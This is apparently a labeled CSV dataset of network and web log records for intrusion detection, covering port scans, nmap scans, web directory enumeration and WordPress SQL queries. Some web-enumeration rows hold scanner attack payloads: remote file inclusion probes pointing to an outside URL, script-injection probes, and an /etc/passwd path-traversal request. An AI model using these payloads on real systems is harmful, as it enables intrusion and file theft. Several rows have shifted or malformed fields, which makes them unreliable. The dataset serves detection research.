@timestamp,src_ip,src_port,dst_ip,dst_port,Protocol,http_request_method,http_request_referrer,http_response_code,url_path,user_agent_original,sql_method,sql_query,category,label_
1666590907,10.0.0.20,33472,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,"SELECT  t.term_id
			FROM wp_terms AS t  INNER JOIN wp_term_taxonomy AS tt ON t.term_id = tt.term_id
			WHERE tt.taxonomy IN ('wp_theme') AND t.name IN ('twentytwenty')
			
			LIMIT 1",sql_enumeration,0
1666691970,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666580403,192.168.207.142,0,0,0,HTTPS,GET,0,404,/libraries/lib-remotehost.inc.php?phpAds_geoPlugin=http://cirt.net/rfiinc.txt?,Mozilla/5.00,0,0,web_enumeration,1
1666692139,10.132.101.52,55716,10.132.101.101,22,TCP,0,0,0,0,0,0,0,port_scan,0
1666691939,100.64.19.22,8443,100.64.19.103,41078,TCP,0,0,0,0,0,0,0,port_scan,3
1666590747,10.0.0.20,33336,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,SELECT option_value FROM wp_options WHERE option_name = 'can_compress_scripts' LIMIT 1,sql_enumeration,0
1666712776, 192.168.10.2,9200,48382,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666690179,192.168.34.11,53208,192.168.33.12,0,HTTP,0,0,0,/pvote/add.php,0,0,0,web_enumeration,2
1666691973,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666692058,10.32.4.176,51252,10.132.100.52,1717,TCP,0,0,0,0,0,0,0,port_scan,0
1666542056,192.168.106.1,50855,192.168.106.130,53,2022-10-24 00:20:34 ALLOW UDP 192.168.106.1 192.168.106.130 50855 53 0 - - - - - - - SEND 25804,UDP,0,0,0,0,0,0,port_scan,2
1666591207,10.0.0.20,33728,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,SELECT option_value FROM wp_options WHERE option_name = 'widget_recent_comments' LIMIT 1,sql_enumeration,0
1666692078,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666691985,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666580395,192.168.207.142,0,0,0,HTTPS,GET,0,404,/_vti_pvt/writeto.cnf,Mozilla/5.00,0,0,web_enumeration,1
1666580407,192.168.207.142,0,0,0,HTTPS,GET,0,400,/blazeds/messagebroker/http,-,0,0,web_enumeration,1
1666712777, 192.168.10.2,9200,48382,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666582477,192.168.207.142,0,0,0,HTTPS,GET,0,404,/BetaBlockModules/GroupModerationModule/GroupModerationModule.php?path_prefix=http://cirt.net/rfiinc.txt?,Mozilla/5.00,0,0,web_enumeration,1
1666690178,192.168.34.11,53114,192.168.33.12,0,HTTP,0,0,0,/community/member.php,0,0,0,web_enumeration,2
1666691945,100.64.19.22,22,100.64.19.103,54452,TCP,0,0,0,0,0,0,0,port_scan,3
1666692146,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666692146,10.32.4.176,43526,10.132.100.52,80,TCP,0,0,0,0,0,0,0,port_scan,0
1666692055,10.32.4.176,39856,10.132.100.52,2492,TCP,0,0,0,0,0,0,0,port_scan,0
1666542079,192.168.106.1,61927,192.168.106.130,53,2022-10-24 00:20:59 ALLOW UDP 192.168.106.1 192.168.106.130 61927 53 0 - - - - - - - SEND 25804,UDP,0,0,0,0,0,0,port_scan,2
1666691992,100.64.19.22,8443,100.64.19.103,44618,TCP,0,0,0,0,0,0,0,port_scan,3
1666580391,192.168.207.142,0,0,0,HTTPS,GET,0,404,/ingres.php,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666691973,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666541388,192.168.1.225,49615,43.229.65.1,8181,2022-10-24 00:09:21 ALLOW UDP 192.168.1.225 43.229.65.1 49615 8181 0 - - - - - - - SEND 4624,UDP,0,0,0,0,0,0,port_scan,1
1666591790,0,0,192.168.106.130,8001,0,0,0,0,0,0,0,0,sql_enumeration,3
1666712777, 10.0.0.3,57340,8080,192.168.10.2,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666712776, 192.168.10.2,9200,48382,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666692057,100.64.19.22,8443,100.64.19.103,44618,TCP,0,0,0,0,0,0,0,port_scan,3
1666542079,192.168.106.1,54003,192.168.106.130,53,2022-10-24 00:20:54 ALLOW UDP 192.168.106.1 192.168.106.130 54003 53 0 - - - - - - - SEND 25804,UDP,0,0,0,0,0,0,port_scan,2
1666630438,192.168.106.130,0,192.168.236.1,0,ICMP,0,0,0,0,0,0,0,port_scan,2
1666582468,192.168.207.142,0,0,0,HTTPS,GET,0,404,/vgn/ac/data,Mozilla/5.00,0,0,web_enumeration,1
1666690178,192.168.34.11,53114,192.168.33.12,0,HTTP,0,0,0,/boilerplate.asp,0,0,0,web_enumeration,2
1666582480,192.168.207.142,0,0,0,HTTPS,GET,0,404,/includes/morcegoCMS/morcegoCMS.php?fichero=http://cirt.net/rfiinc.txt?,Mozilla/5.00,0,0,web_enumeration,1
1666591697,10.0.0.20,34146,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,SELECT option_value FROM wp_options WHERE option_name = 'widget_recent_comments' LIMIT 1,sql_enumeration,0
1666582477,192.168.207.142,0,0,0,HTTPS,GET,0,404,/BetaBlockModules/PopularTagsModule/PopularTagsModule.php?path_prefix=http://cirt.net/rfiinc.txt?,Mozilla/5.00,0,0,web_enumeration,1
1666691957,100.64.19.22,8443,100.64.19.103,43618,TCP,0,0,0,0,0,0,0,port_scan,3
1666580391,192.168.207.142,0,0,0,HTTPS,GET,0,404,/homepage.php,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666692146,100.64.19.22,8443,100.64.19.103,44618,TCP,0,0,0,0,0,0,0,port_scan,3
1664429460,192.168.91.128,46096,142.251.10.94,80,tcp,0,0,0,0,0,0,0,port_scan,2
1666712776, 192.168.10.2,9200,48382,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666591050,0,0,192.168.106.130,8001,0,0,0,0,0,0,0,0,sql_enumeration,3
1666542384,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666692076,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666690179,192.168.34.11,53206,0,0,HTTP,0,0,0,0,0,0,0,web_enumeration,1
1666712777, 10.0.0.3,8000,57894,192.168.10.2,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666542079,192.168.106.1,50735,192.168.106.130,53,2022-10-24 00:20:56 ALLOW UDP 192.168.106.1 192.168.106.130 50735 53 0 - - - - - - - SEND 25804,UDP,0,0,0,0,0,0,port_scan,2
1666542079,192.168.106.1,50751,192.168.106.130,53,2022-10-24 00:20:57 ALLOW UDP 192.168.106.1 192.168.106.130 50751 53 0 - - - - - - - SEND 25804,UDP,0,0,0,0,0,0,port_scan,2
1666692064,10.132.100.52,80,10.32.4.176,46324,TCP,0,0,0,0,0,0,0,port_scan,0
1666692146,100.64.19.22,8443,100.64.19.103,44618,TCP,0,0,0,0,0,0,0,port_scan,3
1666691983,10.32.4.176,41108,10.132.100.53,8994,TCP,0,0,0,0,0,0,0,port_scan,0
1666691945,100.64.19.103,41078,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666692119,100.64.19.22,8443,100.64.19.103,44618,TCP,0,0,0,0,0,0,0,port_scan,3
1666580395,192.168.207.142,0,0,0,HTTPS,GET,0,404,/admin/system_footer.php,Mozilla/5.00,0,0,web_enumeration,1
1666582477,192.168.207.142,0,0,0,HTTPS,GET,0,404,/Ex/modules/threadstop/threadstop.php?exbb[home_path]=http://cirt.net/rfiinc.txt??,Mozilla/5.00,0,0,web_enumeration,1
1666695890, 192.168.10.2,9200,47634,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666691985,10.32.4.176,59344,10.132.100.53,4567,TCP,0,0,0,0,0,0,0,port_scan,0
1666692146,100.64.19.22,8443,100.64.19.103,44618,TCP,0,0,0,0,0,0,0,port_scan,3
1666690178,192.168.34.11,53110,192.168.33.12,0,HTTP,0,0,0,/cgi0bin/environ.cgi,0,0,0,web_enumeration,2
1666591697,10.0.0.20,34146,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,SELECT option_value FROM wp_options WHERE option_name = 'large_crop' LIMIT 1,sql_enumeration,0
1666582481,192.168.207.142,0,0,0,HTTPS,GET,0,404,/modules/history/index.php?full_path=http://cirt.net/rfiinc.txt?,Mozilla/5.00,0,0,web_enumeration,1
1666692056,10.32.4.176,58816,10.132.100.52,32781,TCP,0,0,0,0,0,0,0,port_scan,0
1666712776, 192.168.10.2,9200,48382,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666580392,192.168.207.142,0,0,0,HTTPS,GET,0,404,/6TpFBbQz.asp,Mozilla/5.00,0,0,web_enumeration,1
1666692077,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666591907,10.0.0.20,34324,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,"SELECT t.*, tt.* FROM wp_terms AS t INNER JOIN wp_term_taxonomy AS tt ON t.term_id = tt.term_id WHERE t.term_id IN (1)",sql_enumeration,0
1666590867,10.0.0.20,33438,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,"SELECT   wp_posts.ID
					FROM wp_posts 
					WHERE 1=1  AND ( 
  0 = 1
) AND wp_posts.post_type = 'wp_global_styles' AND ((wp_posts.post_status = 'publish'))
					GROUP BY wp_posts.ID
					ORDER BY wp_posts.post_date DESC
					LIMIT 0, 1",sql_enumeration,0
1666692055,10.32.4.176,44652,10.132.100.52,49400,TCP,0,0,0,0,0,0,0,port_scan,0
1666582466,192.168.207.142,0,0,0,HTTPS,GET,0,404,/cgi-bin-sdb/,Mozilla/5.00,0,0,web_enumeration,1
1666590757,10.0.0.20,33344,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN (1) ORDER BY meta_id ASC",sql_enumeration,0
1666580399,192.168.207.142,0,0,0,HTTPS,GET,0,404,/lcgi/sewse.nlm?sys:/novonyx/suitespot/docs/sewse/viewcode.jse+httplist+httplist/../../../../../system/autoexec.ncf,Mozilla/5.00,0,0,web_enumeration,1
1666690178,192.168.34.11,53112,192.168.33.12,0,HTTP,0,0,0,/cgi0bin/tigvote.cgi,0,0,0,web_enumeration,2
1666542079,192.168.106.1,61292,192.168.106.130,53,2022-10-24 00:21:01 ALLOW UDP 192.168.106.1 192.168.106.130 61292 53 0 - - - - - - - SEND 25804,UDP,0,0,0,0,0,0,port_scan,2
1666690179,192.168.34.11,53206,192.168.33.12,0,HTTP,0,0,0,/modules/Your_Account/navbar.php+,0,0,0,web_enumeration,2
1666712776, 192.168.10.2,9200,48382,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666712776, 192.168.10.2,9200,48382,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666691974,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666692038,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666692145,10.32.4.176,43526,10.132.100.52,80,TCP,0,0,0,0,0,0,0,port_scan,0
1666591620,0,0,10.0.0.21,3306,0,0,0,0,0,0,0,0,sql_enumeration,0
1666712776, 10.0.0.3,1234,49224,192.168.10.2,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666541812,192.168.236.1,64323,239.255.255.250,1900,UDP,0,0,0,0,0,0,0,port_scan,2
1666630467,192.168.106.130,0,192.168.236.1,0,ICMP,0,0,0,0,0,0,0,port_scan,2
1666691972,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666591119,0,0,10.0.0.21,0,0,0,0,0,0,0,0,0,sql_enumeration,0
1666692058,10.32.4.176,50414,10.132.100.52,1761,TCP,0,0,0,0,0,0,0,port_scan,0
1666542079,192.168.106.1,61299,192.168.106.130,53,2022-10-24 00:21:01 ALLOW UDP 192.168.106.1 192.168.106.130 61299 53 0 - - - - - - - SEND 25804,UDP,0,0,0,0,0,0,port_scan,2
1666691985,10.32.4.176,33864,10.132.100.53,8001,TCP,0,0,0,0,0,0,0,port_scan,0
1666348220,192.168.0.4,34852,192.168.0.3,22,tcp,0,0,0,0,0,0,0,port_scan,2
1666690179,192.168.34.11,53206,192.168.33.12,0,HTTP,0,0,0,/modif_infos.asp,0,0,0,web_enumeration,2
1666692139,10.132.101.52,55716,10.132.101.101,22,TCP,0,0,0,0,0,0,0,port_scan,0
1666692077,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666712777, 192.168.10.2,9200,48382,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666692146,10.32.4.176,43526,10.132.100.52,80,TCP,0,0,0,0,0,0,0,port_scan,0
1666582474,192.168.207.142,0,0,0,HTTPS,GET,0,404,/antispam/listdel?file=blacklist&name=b<script>alert('Vulnerable')</script>&startline=0,Mozilla/5.00,0,0,web_enumeration,1
1666631169,192.168.106.130,0,192.168.236.1,0,ICMP,0,0,0,0,0,0,0,port_scan,2
1666692070,10.32.4.176,0,10.132.100.50,0,UDP,0,0,0,0,0,0,0,port_scan,0
1666692057,10.32.4.176,54880,10.132.100.52,2383,TCP,0,0,0,0,0,0,0,port_scan,0
1666590689,0,0,10.0.0.21,3306,0,0,0,0,0,0,0,0,sql_enumeration,0
1666580406,192.168.207.142,0,0,0,HTTPS,GET,0,404,/Federationmetadata/2007-06/FederationMetadata.xml,Mozilla/5.00,0,0,web_enumeration,1
1666692118,10.132.101.101,22,10.132.101.52,55542,TCP,0,0,0,0,0,0,0,port_scan,0
1666712776, 192.168.10.2,9200,48382,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666691985,10.32.4.176,47206,10.132.100.53,3827,TCP,0,0,0,0,0,0,0,port_scan,0
1666542072,0,53458,192.168.106.130,53,0,0,0,0,0,0,0,0,port_scan,3
1666691972,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666692055,10.32.4.176,51924,10.132.100.52,35500,TCP,0,0,0,0,0,0,0,port_scan,0
1664429480,142.251.10.94,80,192.168.91.128,46096,tcp,0,0,0,0,0,0,0,port_scan,2
1666631270,192.168.106.130,0,192.168.236.1,0,ICMP,0,0,0,0,0,0,0,port_scan,2
1666542079,0,53863,192.168.106.130,53,0,0,0,0,0,0,0,0,port_scan,3
1666541336,127.0.0.1,53206,127.0.0.1,1120,2022-10-24 00:08:31 ALLOW TCP 127.0.0.1 127.0.0.1 53206 1120 0 - 0 0 0 - - - SEND 6624,TCP,0,0,0,0,0,0,port_scan,3
1666591850,0,0,10.0.0.21,3306,0,0,0,0,0,0,0,0,sql_enumeration,0
1666591367,10.0.0.20,33870,10.0.0.21,3306,mysql,0,0,0,0,0,SET,SET NAMES utf8mb4,sql_enumeration,0
1666692058,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666542072,0,53742,192.168.106.130,53,0,0,0,0,0,0,0,0,port_scan,3
1666691970,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666691975,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666712776, 10.0.0.3,80,60166,192.168.10.2,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666692056,10.32.4.176,50168,10.132.100.52,6,TCP,0,0,0,0,0,0,0,port_scan,0
1666692043,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666542026,192.168.1.225,60309,74.125.24.138,443,2022-10-24 00:20:03 ALLOW UDP 192.168.1.225 74.125.24.138 60309 443 0 - - - - - - - SEND 18232,UDP,0,0,0,0,0,0,port_scan,1
1666580391,192.168.207.142,0,0,0,HTTPS,GET,0,404,/python,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666591429,0,0,10.0.0.21,3306,0,0,0,0,0,0,0,0,sql_enumeration,0
1664428840,192.168.91.128,33442,192.168.91.1,150,udp,0,0,0,0,0,0,0,port_scan,2
1666580406,192.168.207.142,0,0,0,HTTPS,GET,0,404,/encrypt.asp,Mozilla/5.00,0,0,web_enumeration,1
1666590770,0,0,10.0.0.21,3306,0,0,0,0,0,0,0,0,sql_enumeration,0
1666590767,10.0.0.22,0,10.0.0.20,0,0,0,0,0,0,0,0,0,sql_enumeration,0
1666692118,10.32.4.176,40080,10.132.100.52,22,TCP,0,0,0,0,0,0,0,port_scan,0
1666582478,192.168.207.142,0,0,0,HTTPS,GET,0,404,/biblioteca/bib_pldetails.php?CLASSPATH=http://cirt.net/rfiinc.txt?,Mozilla/5.00,0,0,web_enumeration,1
1666590647,10.0.0.20,33254,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,SELECT option_value FROM wp_options WHERE option_name = 'widget_recent_comments' LIMIT 1,sql_enumeration,0
1666692078,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666580406,192.168.207.142,0,0,0,HTTPS,GET,0,404,/fckeditor/editor/filemanager/connectors/aspx/connector.aspx?Command=GetFolders&Type=File&CurrentFolder=%2F,Mozilla/5.00,0,0,web_enumeration,1
1666690179,192.168.34.11,53232,192.168.33.12,0,HTTP,0,0,0,/cgi0bin/AT0generate.cgi,0,0,0,web_enumeration,2
1666691985,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666580402,192.168.207.142,0,0,0,HTTPS,GET,0,404,/functions/sections.func.php?GLOBALS[PTH][classes]=http://cirt.net/rfiinc.txt??,Mozilla/5.00,0,0,web_enumeration,1
1666580403,192.168.207.142,0,0,0,HTTPS,GET,0,200,/index.php?cms=http://cirt.net/rfiinc.txt??,Mozilla/5.00,0,0,web_enumeration,1
1666692139,10.132.101.52,55716,10.132.101.101,22,TCP,0,0,0,0,0,0,0,port_scan,0
1666582464,192.168.207.142,0,0,0,HTTPS,GET,0,404,/~ftp,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666691946,100.64.19.22,8443,100.64.19.103,37558,TCP,0,0,0,0,0,0,0,port_scan,3
1666421610,192.168.0.3,54468,192.168.0.2,9200,tcp,0,0,0,0,0,0,0,port_scan,2
1666690179,192.168.34.11,53138,192.168.33.12,0,HTTP,0,0,0,/forum1.asp,0,0,0,web_enumeration,2
1666582475,192.168.207.142,0,0,0,HTTPS,GET,0,404,/reports/rwservlet/showjobs,Mozilla/5.00,0,0,web_enumeration,1
1666691984,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666692076,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666541373,0,52137,192.168.1.254,53,0,0,0,0,0,0,0,0,port_scan,3
1666691984,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666704147, 192.168.10.2,9200,47642,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666692145,10.32.4.176,43526,10.132.100.52,80,TCP,0,0,0,0,0,0,0,port_scan,0
1666582484,192.168.207.142,0,0,0,HTTPS,GET,0,404,/js/editor/fckeditor/_whatsnew.html,Mozilla/5.00,0,0,web_enumeration,1
1666691985,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666541927,192.168.1.254,1900,239.255.255.250,1900,2022-10-24 00:18:02 DROP UDP 192.168.1.254 239.255.255.250 1900 1900 354 - - - - - - - RECEIVE 11164,UDP,0,0,0,0,0,0,port_scan,2
1666542072,192.168.106.1,53688,192.168.106.130,53,2022-10-24 00:20:48 ALLOW UDP 192.168.106.1 192.168.106.130 53688 53 0 - - - - - - - SEND 25804,UDP,0,0,0,0,0,0,port_scan,2
1664373437,192.168.91.15,57247,239.255.255.250,1900,UDP,0,0,0,0,0,0,0,port_scan,2
1666542719,192.168.1.225,51638,192.168.1.254,53,UDP,0,0,0,0,0,0,0,port_scan,2
1666542072,0,53728,192.168.106.130,53,0,0,0,0,0,0,0,0,port_scan,3
1666582481,192.168.207.142,0,0,0,HTTPS,GET,0,404,/load_phplib.php?_PHPLIB[libdir]=http://cirt.net/rfiinc.txt?,Mozilla/5.00,0,0,web_enumeration,1
1666591080,0,0,10.0.0.21,3306,0,0,0,0,0,0,0,0,sql_enumeration,0
1666691984,10.32.4.176,46432,10.132.100.53,4129,TCP,0,0,0,0,0,0,0,port_scan,0
1666691983,10.32.4.176,53482,10.132.100.53,5050,TCP,0,0,0,0,0,0,0,port_scan,0
1666580391,192.168.207.142,0,0,0,HTTPS,GET,0,404,/usr,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666691994,10.132.100.53,445,10.32.4.176,41686,TCP,0,0,0,0,0,0,0,port_scan,0
1666691973,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666712776, 192.168.10.2,9200,48382,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666580391,192.168.207.142,0,0,0,HTTPS,GET,0,404,/security.php,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666591757,10.0.0.20,34198,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,SELECT @@SESSION.sql_mode,sql_enumeration,0
1666590900,0,0,192.168.106.130,8001,0,0,0,0,0,0,0,0,sql_enumeration,3
1666541857,127.0.0.1,61004,127.0.0.1,60999,TCP,0,0,0,0,0,0,0,port_scan,3
1666712776, 192.168.10.2,9200,48382,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666631539,192.168.106.130,0,192.168.236.1,0,ICMP,0,0,0,0,0,0,0,port_scan,2
1666692145,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666541306,127.0.0.1,53088,127.0.0.1,5601,2022-10-24 00:08:02 ALLOW TCP 127.0.0.1 127.0.0.1 53088 5601 0 - 0 0 0 - - - RECEIVE 2728,TCP,0,0,0,0,0,0,port_scan,3
1666712776, 192.168.10.2,9200,48382,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666582464,192.168.207.142,0,0,0,HTTPS,GET,0,404,/samples,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666691983,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666582464,192.168.207.142,0,0,0,HTTPS,GET,0,404,/dns,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666690178,192.168.34.11,53114,192.168.33.12,0,HTTP,0,0,0,/abonnement.asp,0,0,0,web_enumeration,2
1666692146,100.64.19.22,8443,100.64.19.103,44618,TCP,0,0,0,0,0,0,0,port_scan,3
1666591427,10.0.0.20,33920,10.0.0.21,3306,mysql,0,0,0,0,0,SET,SET NAMES 'utf8mb4' COLLATE 'utf8mb4_unicode_ci',sql_enumeration,0
1666421620,192.168.0.3,54468,192.168.0.2,9200,tcp,0,0,0,0,0,0,0,port_scan,2
1666631412,192.168.106.130,0,192.168.236.1,0,ICMP,0,0,0,0,0,0,0,port_scan,2
1666591230,0,0,10.0.0.21,3306,0,0,0,0,0,0,0,0,sql_enumeration,0
1666692146,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666580407,192.168.207.142,0,0,0,HTTPS,GET,0,404,/js/editor/fckeditor/editor/filemanager/connectors/php/connector.php?Command=GetFolders&Type=File&CurrentFolder=%2F,Mozilla/5.00,0,0,web_enumeration,1
1666691984,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666582474,192.168.207.142,0,0,0,HTTPS,GET,0,404,/scripts/admin.pl,Mozilla/5.00,0,0,web_enumeration,1
1666542161,192.168.106.1,63535,239.255.255.250,1900,2022-10-24 00:22:08 ALLOW UDP 192.168.106.1 239.255.255.250 63535 1900 0 - - - - - - - SEND 17808,UDP,0,0,0,0,0,0,port_scan,2
1666692057,10.32.4.176,54806,10.132.100.52,1071,TCP,0,0,0,0,0,0,0,port_scan,0
1666692057,10.32.4.176,36508,10.132.100.52,1272,TCP,0,0,0,0,0,0,0,port_scan,0
1666582469,192.168.207.142,0,0,0,HTTPS,GET,0,404,/postnuke/html/modules.php?op=modload&name=News&file=article&sid=<script>alert('Vulnerable');</script>,Mozilla/5.00,0,0,web_enumeration,1
1666580398,192.168.207.142,0,0,0,HTTPS,GET,0,404,/shop/show.php,Mozilla/5.00,0,0,web_enumeration,1
1666580391,192.168.207.142,0,0,0,HTTPS,GET,0,404,/policy,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666692058,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666582485,192.168.207.142,0,0,0,HTTPS,GET,0,404,/horde/util/barcode.php?type=../../../../../../../../../../../etc/./passwd%00,Mozilla/5.00,0,0,web_enumeration,1
1666691974,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666580391,192.168.207.142,0,0,0,HTTPS,GET,0,404,/testing.php,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666712776, 192.168.10.2,9200,48382,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666580392,192.168.207.142,0,0,0,HTTPS,GET,0,404,/6TpFBbQz.exe,Mozilla/5.00,0,0,web_enumeration,1
1666712776, 192.168.10.2,9200,48382,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666590617,10.0.0.20,33228,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,SELECT option_value FROM wp_options WHERE option_name = 'widget_recent_entries' LIMIT 1,sql_enumeration,0
1666582478,192.168.207.142,0,0,0,HTTPS,GET,0,404,/com_realestatemanager/toolbar_ext.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt??,Mozilla/5.00,0,0,web_enumeration,1
1666712776, 192.168.10.2,9200,48382,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666712777, 192.168.10.2,9200,48382,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666580405,192.168.207.142,0,0,0,HTTPS,GET,0,404,/dir-login/,Mozilla/5.00,0,0,web_enumeration,1
1666542072,0,53399,192.168.106.130,53,0,0,0,0,0,0,0,0,port_scan,3
1666690178,192.168.34.11,53112,0,0,HTTP,0,0,0,0,0,0,0,web_enumeration,1
1666691974,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666631197,192.168.106.130,0,192.168.236.1,0,ICMP,0,0,0,0,0,0,0,port_scan,2
1666692058,100.64.19.22,8443,100.64.19.103,44618,TCP,0,0,0,0,0,0,0,port_scan,3
1666580399,192.168.207.142,0,0,0,HTTPS,GET,0,404,/inc/fckeditor/editor/dialog/fck_link.html,Mozilla/5.00,0,0,web_enumeration,1
1666691984,10.32.4.176,40010,10.132.100.53,27715,TCP,0,0,0,0,0,0,0,port_scan,0
1666582485,192.168.207.142,0,0,0,HTTPS,GET,0,404,/etc/reports,Mozilla/5.00,0,0,web_enumeration,1
1666712777, 192.168.10.2,9200,48406,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666712776, 192.168.10.2,9200,48382,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
